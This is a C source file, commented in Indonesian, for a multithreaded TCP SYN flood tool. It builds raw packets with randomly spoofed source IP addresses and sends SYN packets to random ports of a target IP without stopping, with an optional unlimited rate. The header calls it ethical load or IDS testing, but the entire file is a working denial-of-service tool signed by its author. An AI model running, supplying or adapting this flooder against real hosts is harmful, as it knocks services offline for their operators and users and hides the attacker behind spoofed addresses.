/*
 * Uji TCP SYN Flood (Etikal Testing)
 * Digunakan untuk simulasi beban server atau IDS
 * Kompatibel dengan Linux (gunakan root)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PACKET_SIZE 8192

volatile int pps = 0;
volatile int sleep_time = 100;
volatile int limiter = 0;

// Hitung checksum IP
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while(len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if(len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Hitung checksum TCP
unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    struct pseudo_header {
        unsigned int src;
        unsigned int dst;
        unsigned char zero;
        unsigned char protocol;
        unsigned short length;
    } pseudo;

    int tcp_len = sizeof(struct tcphdr);
    char *buffer = malloc(sizeof(pseudo) + tcp_len);
    pseudo.src = iph->saddr;
    pseudo.dst = iph->daddr;
    pseudo.zero = 0;
    pseudo.protocol = IPPROTO_TCP;
    pseudo.length = htons(tcp_len);

    memcpy(buffer, &pseudo, sizeof(pseudo));
    memcpy(buffer + sizeof(pseudo), tcph, tcp_len);

    unsigned short result = checksum((unsigned short*)buffer, sizeof(pseudo) + tcp_len);
    free(buffer);
    return result;
}

void setup_headers(char *packet, const char *target_ip) {
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Random IP spoofing
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand();
    iph->daddr = inet_addr(target_ip);
    iph->check = checksum((unsigned short*)iph, sizeof(struct iphdr));

    tcph->source = htons(rand() % 65535);
    tcph->dest = htons(rand() % 1024 + 1); // Port acak
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->ack = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->check = tcp_checksum(iph, tcph);
}

void *flood_thread(void *arg) {
    const char *target_ip = (char *)arg;
    char packet[PACKET_SIZE];
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(0); // random port
    sin.sin_addr.s_addr = inet_addr(target_ip);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket error");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        pthread_exit(NULL);
    }

    memset(packet, 0, PACKET_SIZE);

    while (1) {
        setup_headers(packet, target_ip);
        sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
               (struct sockaddr *)&sin, sizeof(sin));
        pps++;
        if (limiter > 0 && pps >= limiter) {
            usleep(sleep_time);
            pps = 0;
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <target IP> <threads> <pps limiter, -1=no limit> <duration>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *target_ip = argv[1];
    int threads = atoi(argv[2]);
    limiter = atoi(argv[3]);
    int duration = atoi(argv[4]);

    srand(time(NULL));
    pthread_t tid[threads];

    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, flood_thread, (void *)target_ip);
    }

    printf("Flood started By PASAAAAAAA. Press Ctrl+C to stop or wait %d seconds...\n", duration);
    sleep(duration);
    printf("Flood complete.\n");

    return 0;
}
